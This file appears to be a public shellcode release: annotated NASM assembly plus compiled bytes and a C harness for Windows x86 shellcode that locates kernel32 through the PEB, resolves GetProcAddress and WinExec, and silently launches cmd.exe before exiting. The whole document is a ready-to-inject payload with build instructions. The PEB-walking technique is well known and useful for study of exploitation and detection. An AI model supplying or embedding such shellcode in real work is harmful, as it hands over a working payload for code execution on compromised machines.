/*
   # Title : Windows x86 WinExec("cmd.exe",0) shellcode
   # Date : 07/06/2016
   # Author : Roziul Hasan Khan Shifat
   # Tested On : Windows 7 Professional x86
*/

/*
To Compile:
--------------

$nasm -f win32 winexec.asm -o exec.obj


Linking:
----------
$ "C:\Program Files\CodeBlocks\MinGW\bin\ld.exe" -o winexec.exe exec.obj


*/

/*

section .text
  	global _start
_start:

;Finding base address of kernel32.dll

xor ecx,ecx
mov eax,[fs:0x30] ;loading PEB(Process Environment Block) in Eax
mov eax,[eax+0xc] ;Eax=PEB->Ldr
mov esi,[eax+0x14] ;Eax=Peb->Ldr.InMemOrderModuleList
lodsd ;Eax=second module of InMemOrderModuleList (ntdll.dll)
xchg eax,esi ;Eax=Esi ,Esi=Eax
lodsd ;Eax=third module of InMemOrderModuleList (kernel32.dll)
mov ebx,[eax+0x10] ;Ebx=base Address of Kernel32.dll (PVOID Dllbase)

;-------------------------------------------------------------------------------------------------------



;Finding Export table of Kernel32.dll

mov edx,[ebx+0x3c] ;(kernel32.dll base address+0x3c)=DOS->e_lfanew
add edx,ebx ;(DOS->e_lfanew+base address of kernel32.dll)=PE Header
mov edx,[edx+0x78] ;(PE Header+0x78)=DataDirectory->VirtualAddress
add edx,ebx ; (DataDirectory->VirtualAddress+kernel32.dll base address)=Export table of kernel32.dll (IMAGE_EXPORT_DIRECTORY)
mov esi,[edx+0x20] ;(IMAGE_EXPORT_DIRECTORY+0x20)=AddressOfNames
add esi,ebx ; ESI=(AddressOfNames+kernel32.dll base address)=kernel32.dll AddressOfNames
xor ecx,ecx

;--------------------------------------------------------------------------------------------------------------


;finding GetProcAddress function name

Get_func:

inc ecx ;Incrementing the Ordinal
lodsd ;Get name Offset
add eax,ebx ;(name offset+kernel32.dll base address)=Get Function name
cmp dword [eax],0x50746547 ;GetP
jnz Get_func
cmp dword [eax+0x4],0x41636f72 ; rocA
jnz Get_func
cmp dword [eax+0x8],0x65726464 ; ddre
jnz Get_func

;-----------------------------------------------------------------------------------------------------------



;finding the address of GetProcAddress

mov esi,[edx+0x24] ;Esi=(IMAGE_EXPORT_DIRECTORY+0x24)=AddressOfNameOrdinals
add esi,ebx ;(AddressOfNameOrdinals+base address of kernel32.dll)=AddressOfNameOrdinals of kernel32.dll
mov cx,[esi+ecx*2] ;CX=Number of Function
dec ecx
mov esi,[edx+0x1c] ;(IMAGE_EXPORT_DIRECTORY+0x1c)=AddressOfFunctions
add esi,ebx ;ESI=beginning of Address table
mov edx,[esi+ecx*4] ;EDX=Pointer(offset)
add edx,ebx ;Edx=Address of GetProcAddress

;-------------------------------------------------------------------------------------------------------

;backing up address of GetProcAddress because EAX,EBX,EDX,ECX Register value will be changed after calling function
xor esi,esi
push edx
pop esi

;----------------------------------------

;backing up kernel32.dll base address
xor edi,edi
push ebx
pop edi

;------------------------
;Finding address of Winexe()
xor ecx,ecx
push ecx
push 0x00636578
push 0x456e6957

mov ecx,esp

push ecx
push ebx

call edx
;-----------------------
;finding address of ExitProcess
xor ecx,ecx
push ecx
push 0x00737365
push 0x636f7250
push 0x74697845

mov ecx,esp

push ecx
push edi

xor edi,edi
mov edi,eax ;address of WinExec

call esi

;---------------

xor esi,esi
push eax
pop esi ;address of ExitProcess
;-------------------
;calling winexec
xor ecx,ecx
push ecx
push 0x00657865
push 0x2e646d63

mov ecx,esp

push 0
push ecx

call edi

;--------------
;exiting
push 0
call esi

*/






#include<stdio.h>

char shellcode[]=\

"\x31\xc9\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xf6\x52\x5e\x31\xff\x53\x5f\x31\xc9\x51\x68\x78\x65\x63\x00\x68\x57\x69\x6e\x45\x89\xe1\x51\x53\xff\xd2\x31\xc9\x51\x68\x65\x73\x73\x00\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\xe1\x51\x57\x31\xff\x89\xc7\xff\xd6\x31\xf6\x50\x5e\x31\xc9\x51\x68\x65\x78\x65\x00\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x00\x51\xff\xd7\x6a\x00\xff\xd6\xff\xff\xff\xff\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00";

main()
{

(* (int(*)()) shellcode)();
}